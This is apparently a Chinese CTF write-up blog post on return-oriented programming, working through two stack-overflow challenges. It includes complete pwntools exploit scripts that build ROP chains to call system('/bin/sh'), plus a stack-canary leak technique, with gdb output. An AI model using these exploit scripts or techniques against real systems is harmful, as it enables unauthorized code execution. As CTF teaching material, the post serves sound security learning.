---
title: "PWN:ROP"
image: ''
pinned: false
comment: true
published: 2026-03-04
description: "PWN"
category: PWN
tags: [PWN]
---

---

PWN中:ROP使用方法



## 一:

![image-20260304185547856](/images/image-20260304185547856.png)

虽然这一题是溢出的题目，但关键的考点还是在rop的使用。

直接通过ida和ubuntu的指令进行分析，可以很明显的发现存在栈溢出的点，但不存在直接system("/bin/sh")给我用，仅仅只有一个notbackdoor的函数直接包含了ls的system指令，所以正常的栈溢出，是无法直接得到flag的，只能看见根目录的各种文件并发现有个名字就叫flag的文件。

虽然在另一篇文章写过rop的原理，但在这边还是简单做一个讲解。



简单来说，**ROP** 是一种存在保护时（比如开启NX，堆栈不可执行）的情况下，使用的攻击技术。

我们可以通过与正常shellcode进行比较来做进一步理解：

- **正常Shellcode**：就比如栈溢出，我们直接利用垃圾数据流覆盖缓冲区，将我们需要执行的函数地址写在ret的后面，欺骗程序去执行，劫持执行流。
- **ROP**：相当于用最基础的函数去完成我们的攻击，比如直接在程序的函数表里寻找我们需要的函数，比如puts，open，system之类的函数。



由于程序no pie 所以我们不需要用基址加偏移的方法，而是可以直接静态分析得到的。

通过ropgaget的攻击找到pop_rdi的地址，在程序里面直接搜索字符串和函数，可以得到/bin/sh的地址和system函数的地址。

offset是在ida里面通过看栈分布，得到程序允许我们输入的字节为0x20，而本身寄存器有占了8字节，

![image-20260304194836848](/images/image-20260304194836848.png)

将通过发送40个字节的a就可以覆盖缓冲区，然后用ret，栈对齐一下，用pop_rdi传送/bin/sh给system，然后调用system，完成shell的获得。

```
from pwn import *

io = remote('171.80.2.169', 18784) 

offset = 40
pop_rdi = 0x40126b     
bin_sh = 0x402004      
system_plt = 0x401050  
ret = 0x40126c      

# 填充 -> 栈对齐 -> 把 /bin/sh 送入 RDI -> 调用 system
payload = b'A' * offset 
payload += p64(ret)      
payload += p64(pop_rdi) 
payload += p64(bin_sh) 
payload += p64(system_plt)


io.sendlineafter(b"Please Input your name.", payload) 
io.interactive()
```



----



## 二:

![image-20260306130710599](/images/image-20260306130710599.png)

这是一道栈溢出加canary绕过加rop传参数的题目，通过file和checksec，我们可以得到程序为64位大端序，存在canary，no pie，

通过运行程序和简单的静态分析，我们可以知道，程序两次读入我的数据，读入函数均为read。

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[48]; // [rsp+10h] [rbp-240h] BYREF
  char v5[520]; // [rsp+40h] [rbp-210h] BYREF
  unsigned __int64 v6; // [rsp+248h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  write(1, "Welcome!\n", 0x10u);
  write(1, "Please leave your name(Within 36 Length):", 0x29u);
  read(0, buf, 0x300u);
  printf("Hello %s\n", buf);
  write(1, "Please leave a message(Within 0x200 Length):", 0x2Cu);
  read(0, v5, 0x300u);
  printf("your message is :%s \nBye~", v5);
  return 0;
}
```

而且通过对栈上数据的计算可得到，第二次输入的数据到覆盖ret地址需要0x208地址的垃圾数据流，现在关键是在于寻找canary的值和位置，虽然不知道为什么末字节为00，但canary的数据是0x...........的数据流。

通过多次gdb分析，我们可以得到，canary的实际位置为：

```
0b:0058│-1f8 0x7fffffffdd28 ◂— 0
... ↓ 61 skipped 
49:0248│-008 0x7fffffffdf18 ◂— 0xe65218c0afbe2700 
4a:0250│ rbp 0x7fffffffdf20 ◂— 1
```

```
[buffer ...]
[canary]      <-- rbp-0x8
[saved rbp]   <-- rbp
[ret addr]    <-- rbp+8
```

寻找到canary的位置后，通过在canary后面加上\x00强制打印可以得到canary值，通过填充垃圾数据流，在第一次发送数据时，打印canary，就可以绕过canary保护。

然后使用rop技术通过将程序里面的/bin/sh参数传送给函数system，完成shell的调用。

objdump -d pwn4 | grep "system@plt"

没有pie减少了很少麻烦，否则就需要计算偏移加动态分析 了/。

```
from pwn import *

p = remote("171.80.2.169", 18237)
context.arch = 'amd64'
context.log_level = 'debug'

bin_sh = 0x601068           # /bin/sh 地址
pop_rdi = 0x400963          # pop rdi; ret
system_plt = 0x400660       #system 地址
ret_gadget = 0x400813       # ret 对齐


leak_offset = 0x238         # buf 到 canary
exploit_offset = 0x208      # message 到 canary

log.info("正在泄露远程 Canary...")


payload_leak = b'a' * leak_offset + b'z'
p.sendafter(b"your name(Within 36 Length):", payload_leak)

p.recvuntil(b'z')


canary_raw = p.recv(7)
canary = u64(canary_raw.rjust(8, b'\x00')) 

log.success(f"成功获取 Canary: {hex(canary)}")


log.info("正在发送 ROP 链获取 Shell...")


rop = [
    ret_gadget,         
    pop_rdi, bin_sh,       
    system_plt          
]

payload_final = b'a' * exploit_offset
payload_final += p64(canary)
payload_final += b'b' * 8        
payload_final += b''.join([p64(i) for i in rop])

p.sendafter(b"leave a message", payload_final)

p.interactive()
```

![image-20260306132139961](/images/image-20260306132139961.png)



----















---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。

